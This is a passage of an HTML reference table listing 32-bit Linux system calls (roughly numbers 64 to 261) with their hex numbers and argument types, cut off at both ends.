newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>64</td><td>getppid</td><td>0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>65</td><td>getpgrp</td><td>0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>66</td><td>setsid</td><td>0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>67</td><td>sigaction</td><td>0x43</td><td>int</td><td>const struct old_sigaction *</td><td>struct old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>68</td><td>sgetmask</td><td>0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>69</td><td>ssetmask</td><td>0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>70</td><td>setreuid</td><td>0x46</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>71</td><td>setregid</td><td>0x47</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>72</td><td>sigsuspend</td><td>0x48</td><td>int unused1</td><td>int unused2</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>73</td><td>sigpending</td><td>0x49</td><td>old_sigset_t *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>74</td><td>sethostname</td><td>0x4a</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>75</td><td>setrlimit</td><td>0x4b</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>76</td><td>getrlimit</td><td>0x4c</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>77</td><td>getrusage</td><td>0x4d</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>78</td><td>gettimeofday</td><td>0x4e</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>79</td><td>settimeofday</td><td>0x4f</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>80</td><td>getgroups</td><td>0x50</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>81</td><td>setgroups</td><td>0x51</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>82</td><td>select</td><td>0x52</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timeval *tvp</td><td>-</td></tr><tr><td>83</td><td>symlink</td><td>0x53</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>84</td><td>oldlstat</td><td>0x54</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>85</td><td>readlink</td><td>0x55</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td>86</td><td>uselib</td><td>0x56</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>87</td><td>swapon</td><td>0x57</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>88</td><td>reboot</td><td>0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td>89</td><td>readdir</td><td>0x59</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>90</td><td>mmap</td><td>0x5a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>91</td><td>munmap</td><td>0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>92</td><td>truncate</td><td>0x5c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>93</td><td>ftruncate</td><td>0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>94</td><td>fchmod</td><td>0x5e</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>95</td><td>fchown</td><td>0x5f</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>96</td><td>getpriority</td><td>0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>97</td><td>setpriority</td><td>0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td>98</td><td>profil</td><td>0x62</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>99</td><td>statfs</td><td>0x63</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>100</td><td>fstatfs</td><td>0x64</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>101</td><td>ioperm</td><td>0x65</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td></tr><tr><td>102</td><td>socketcall</td><td>0x66</td><td>int call</td><td>unsigned long *args</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>103</td><td>syslog</td><td>0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td>104</td><td>setitimer</td><td>0x68</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td>105</td><td>getitimer</td><td>0x69</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>106</td><td>stat</td><td>0x6a</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>107</td><td>lstat</td><td>0x6b</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>108</td><td>fstat</td><td>0x6c</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>109</td><td>olduname</td><td>0x6d</td><td>struct oldold_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>110</td><td>iopl</td><td>0x6e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>111</td><td>vhangup</td><td>0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>112</td><td>idle</td><td>0x70</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>113</td><td>vm86old</td><td>0x71</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>114</td><td>wait4</td><td>0x72</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td>115</td><td>swapoff</td><td>0x73</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>116</td><td>sysinfo</td><td>0x74</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>117</td><td>ipc</td><td>0x75</td><td>unsigned int call</td><td>int first</td><td>unsigned long second</td><td>unsigned long third</td><td>void *ptr</td><td>long fifth</td></tr><tr><td>118</td><td>fsync</td><td>0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>119</td><td>sigreturn</td><td>0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>120</td><td>clone</td><td>0x78</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td>121</td><td>setdomainname</td><td>0x79</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>122</td><td>uname</td><td>0x7a</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>123</td><td>modify_ldt</td><td>0x7b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>124</td><td>adjtimex</td><td>0x7c</td><td>struct timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>125</td><td>mprotect</td><td>0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td>126</td><td>sigprocmask</td><td>0x7e</td><td>int how</td><td>old_sigset_t *set</td><td>old_sigset_t *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td>127</td><td>create_module</td><td>0x7f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>128</td><td>init_module</td><td>0x80</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td>129</td><td>delete_module</td><td>0x81</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>130</td><td>get_kernel_syms</td><td>0x82</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>131</td><td>quotactl</td><td>0x83</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td>132</td><td>getpgid</td><td>0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>133</td><td>fchdir</td><td>0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>134</td><td>bdflush</td><td>0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>135</td><td>sysfs</td><td>0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td>136</td><td>personality</td><td>0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>137</td><td>afs_syscall</td><td>0x89</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>138</td><td>setfsuid</td><td>0x8a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>139</td><td>setfsgid</td><td>0x8b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>140</td><td>_llseek</td><td>0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>141</td><td>getdents</td><td>0x8d</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>142</td><td>_newselect</td><td>0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>143</td><td>flock</td><td>0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>144</td><td>msync</td><td>0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>145</td><td>readv</td><td>0x91</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td>146</td><td>writev</td><td>0x92</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td>147</td><td>getsid</td><td>0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>148</td><td>fdatasync</td><td>0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>149</td><td>_sysctl</td><td>0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>150</td><td>mlock</td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>151</td><td>munlock</td><td>0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>152</td><td>mlockall</td><td>0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>153</td><td>munlockall</td><td>0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>154</td><td>sched_setparam</td><td>0x9a</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>155</td><td>sched_getparam</td><td>0x9b</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>156</td><td>sched_setscheduler</td><td>0x9c</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td>157</td><td>sched_getscheduler</td><td>0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>158</td><td>sched_yield</td><td>0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>159</td><td>sched_get_priority_max</td><td>0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>160</td><td>sched_get_priority_min</td><td>0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>161</td><td>sched_rr_get_interval</td><td>0xa1</td><td>pid_t pid</td><td>struct timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>162</td><td>nanosleep</td><td>0xa2</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>163</td><td>mremap</td><td>0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td>164</td><td>setresuid</td><td>0xa4</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>165</td><td>getresuid</td><td>0xa5</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>166</td><td>vm86</td><td>0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>167</td><td>query_module</td><td>0xa7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>168</td><td>poll</td><td>0xa8</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td>169</td><td>nfsservctl</td><td>0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>170</td><td>setresgid</td><td>0xaa</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>171</td><td>getresgid</td><td>0xab</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td>172</td><td>prctl</td><td>0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td>173</td><td>rt_sigreturn</td><td>0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>174</td><td>rt_sigaction</td><td>0xae</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td>175</td><td>rt_sigprocmask</td><td>0xaf</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td>176</td><td>rt_sigpending</td><td>0xb0</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>177</td><td>rt_sigtimedwait</td><td>0xb1</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td>178</td><td>rt_sigqueueinfo</td><td>0xb2</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td>179</td><td>rt_sigsuspend</td><td>0xb3</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>180</td><td>pread64</td><td>0xb4</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td>181</td><td>pwrite64</td><td>0xb5</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td>182</td><td>chown</td><td>0xb6</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>183</td><td>getcwd</td><td>0xb7</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>184</td><td>capget</td><td>0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>185</td><td>capset</td><td>0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>186</td><td>sigaltstack</td><td>0xba</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>187</td><td>sendfile</td><td>0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td>188</td><td>getpmsg</td><td>0xbc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>189</td><td>putpmsg</td><td>0xbd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>190</td><td>vfork</td><td>0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>191</td><td>ugetrlimit</td><td>0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>192</td><td>mmap2</td><td>0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>193</td><td>truncate64</td><td>0xc1</td><td>const char *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>194</td><td>ftruncate64</td><td>0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>195</td><td>stat64</td><td>0xc3</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>196</td><td>lstat64</td><td>0xc4</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>197</td><td>fstat64</td><td>0xc5</td><td>unsigned long fd</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>198</td><td>lchown32</td><td>0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>199</td><td>getuid32</td><td>0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>200</td><td>getgid32</td><td>0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>201</td><td>geteuid32</td><td>0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>202</td><td>getegid32</td><td>0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>203</td><td>setreuid32</td><td>0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>204</td><td>setregid32</td><td>0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>205</td><td>getgroups32</td><td>0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>206</td><td>setgroups32</td><td>0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>207</td><td>fchown32</td><td>0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>208</td><td>setresuid32</td><td>0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>209</td><td>getresuid32</td><td>0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>210</td><td>setresgid32</td><td>0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>211</td><td>getresgid32</td><td>0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>212</td><td>chown32</td><td>0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>213</td><td>setuid32</td><td>0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>214</td><td>setgid32</td><td>0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>215</td><td>setfsuid32</td><td>0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>216</td><td>setfsgid32</td><td>0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>217</td><td>pivot_root</td><td>0xd9</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>218</td><td>mincore</td><td>0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td>219</td><td>madvise</td><td>0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td>220</td><td>getdents64</td><td>0xdc</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>221</td><td>fcntl64</td><td>0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>222</td><td>not implemented</td><td>0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>223</td><td>not implemented</td><td>0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>224</td><td>gettid</td><td>0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>225</td><td>readahead</td><td>0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>226</td><td>setxattr</td><td>0xe2</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td>227</td><td>lsetxattr</td><td>0xe3</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td>228</td><td>fsetxattr</td><td>0xe4</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td>229</td><td>getxattr</td><td>0xe5</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td>230</td><td>lgetxattr</td><td>0xe6</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td>231</td><td>fgetxattr</td><td>0xe7</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td>232</td><td>listxattr</td><td>0xe8</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>233</td><td>llistxattr</td><td>0xe9</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>234</td><td>flistxattr</td><td>0xea</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>235</td><td>removexattr</td><td>0xeb</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>236</td><td>lremovexattr</td><td>0xec</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>237</td><td>fremovexattr</td><td>0xed</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>238</td><td>tkill</td><td>0xee</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>239</td><td>sendfile64</td><td>0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td>240</td><td>futex</td><td>0xf0</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>241</td><td>sched_setaffinity</td><td>0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>242</td><td>sched_getaffinity</td><td>0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>243</td><td>set_thread_area</td><td>0xf3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>244</td><td>get_thread_area</td><td>0xf4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>245</td><td>io_setup</td><td>0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>246</td><td>io_destroy</td><td>0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>247</td><td>io_getevents</td><td>0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct timespec *timeout</td><td>-</td></tr><tr><td>248</td><td>io_submit</td><td>0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>249</td><td>io_cancel</td><td>0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td>250</td><td>fadvise64</td><td>0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td>251</td><td>not implemented</td><td>0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>252</td><td>exit_group</td><td>0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>253</td><td>lookup_dcookie</td><td>0xfd</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td>254</td><td>epoll_create</td><td>0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>255</td><td>epoll_ctl</td><td>0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td>256</td><td>epoll_wait</td><td>0x100</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td>257</td><td>remap_file_pages</td><td>0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td>258</td><td>set_tid_address</td><td>0x102</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>259</td><td>timer_create</td><td>0x103</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td>260</td><td>timer_settime</td><td>0x104</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td>261</td><td>timer_gettime</td><td>0x105</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec 